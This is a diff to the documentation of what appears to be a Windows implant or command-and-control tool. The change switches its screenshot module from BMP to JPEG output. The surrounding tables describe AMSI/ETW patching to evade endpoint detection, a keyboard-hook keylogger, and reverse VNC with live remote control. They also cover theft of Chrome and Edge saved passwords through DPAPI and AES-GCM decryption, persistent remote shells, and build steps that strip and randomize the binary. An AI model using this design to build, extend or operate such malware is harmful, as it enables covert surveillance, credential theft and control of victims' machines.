@@ -219,7 +219,7 @@ sequenceDiagram
 | **Supervisor** | Any worker exit other than `0xDEAD` (clean operator `exit` / migration) is treated as a crash and restarted with exponential backoff capped at 60 s. |
 | **Evasion re-apply** | AMSI/ETW patches are re-applied on every beacon pass and forcibly re-applied after a reconnect, because a restarting EDR can un-patch the process. |
 | **Beacon pacing** | Immediate re-beacon after executing a task (no sleep) so command chains run back-to-back; consecutive failures back off as `BEACON_MIN × BACKOFF_FACTOR^(failures-1)`, holding after `MAX_FAILURES` steps and capped at `BACKOFF_MAX_SEC` (30 min). The same schedule covers thrown exceptions, and it shortens to 3 s while in rapid-poll shell mode. |
-| **Output caps** | Text results are truncated at `CMD_OUTPUT_MAX`; screenshots and `!live` frames are exempt and allowed up to 32 MB, otherwise base64 BMPs arrive corrupted. |
+| **Output caps** | Text results are truncated at `CMD_OUTPUT_MAX`; screenshots and `!live` frames are exempt and allowed up to 32 MB, otherwise base64 images arrive corrupted. |
 
 ---
 
@@ -364,7 +364,7 @@ Net effect: `strings` on the binary yields no URLs, no API names and no PowerShe
 | Module | Implementation |
 |---|---|
 | `keylog.cpp` | `WH_KEYBOARD_LL` hook on a dedicated pumped thread; `ToUnicode` for dead keys/shift, common VKs mapped to tokens (`[BS]`, `[ESC]`, `[PGU]`…), bare modifiers ignored, circular buffer capped at 64 K chars, mutex-guarded |
-| `!screenshot` | GDI capture to a 32 bpp DIB, BMP with `[SCREENSHOT:BMP]` marker, streamed base64; optional scale factor |
+| `!screenshot` | GDI capture of the primary screen (optionally scaled 15–100 %), encoded to **JPEG at quality 82** through GDI+ and marked `[SCREENSHOT:JPEG]`, streamed base64. Falls back automatically to a 24 bpp BMP marked `[SCREENSHOT:BMP]` when GDI+ is unavailable or the encode fails, so the command never breaks |
 | `vnc.cpp` | **Reverse VNC**: dials `host[:port]` (default 5500) and serves RFB **3.3** with *None* auth; 32×32 changed-tile encoding, `SendInput` replay for keyboard/mouse. Because the implant is the connector, the operator side must be **listening** — a viewer in reverse/listen mode, or an ngrok TCP endpoint in front of one. Non-blocking connect with a 5 s cap so a dead endpoint cannot stall the beacon |
 | `!live` / `!input` | Beacon-paced remote control: one task returns a scaled frame and optionally injects normalized mouse coordinates (`!input m <nx> <ny> <btns>`) or a virtual-key event (`!input k <vk> <down>`), enabling browser-based interactive control from the dashboard |
 | `!browser` | Edge / Chrome saved-password recovery (T1555.003) using **stock Windows only**: `winsqlite3.dll` reads a copy of `Login Data`, `os_crypt` master key from `Local State` is DPAPI-unprotected, then AES-256-GCM (bcrypt) on `v10`/`v11` blobs with plain-DPAPI fallback for pre-v80 rows. Chrome ≥ 127 `v20` app-bound entries are **detected and reported as not recoverable**. The PowerShell payload is embedded as XOR chunks generated from `tests/browser_dump.ps1` |
@@ -484,7 +484,7 @@ implant owns the shell state, so the working directory and `set` variables survi
 | `<any shell command>` | Persistent cmd.exe; `cd X`, bare `D:` and `set VAR=v` carry over to the next task |
 | `ps` / `!ps` | Process listing |
 | `ps1 <line>` · `psreset` | Persistent interactive PowerShell session; restart it |
-| `!screenshot [scale]` | Full-screen capture, BMP streamed as base64 |
+| `!screenshot [scale]` | Full-screen capture, JPEG streamed as base64 (automatic BMP fallback) |
 | `!vnc <host[:port]>` | **Reverse VNC** — dials out (default port 5500); have a viewer listening in **reverse/listen mode** before tasking (RFB 3.3, no auth) |
 | `!live [scale]` · `!input m <nx> <ny> <btns>` · `!input k <vk> <down>` | Beacon-paced live frame / synthetic mouse and keyboard input |
 | `keylog_start` · `keylog_dump` · `keylog_stop` | Keystroke capture lifecycle |
@@ -535,7 +535,7 @@ Windows hosts can build the same way under WSL; the implant itself only *runs* o
 |---|---|
 | Resource compile | `windres resources/ghost.rc` → version info, manifest, embedded `wall.jpg` as `RCDATA` |
 | Compile | C++17, `UNICODE`, `_WIN32_WINNT=0x0A00`, `-fno-rtti`, function/data sections, `-fstack-protector-strong`, static libstdc++/libgcc |
-| Link | `-Wl,--gc-sections --nxcompat --dynamicbase --high-entropy-va` against `ntdll ws2_32 user32 advapi32 ole32 oleaut32 wbemuuid bcrypt crypt32 winhttp dnsapi shlwapi gdi32 shell32` |
+| Link | `-Wl,--gc-sections --nxcompat --dynamicbase --high-entropy-va` against `ntdll ws2_32 user32 advapi32 ole32 oleaut32 wbemuuid bcrypt crypt32 winhttp dnsapi shlwapi gdi32 gdiplus shell32` |
 | Post | `strip --strip-all` + remove `.comment`/`.note`; randomize the PE `TimeDateStamp` |
 
 The build is warning-clean under `-Wall -Wextra` (a few specific warnings are silenced deliberately);
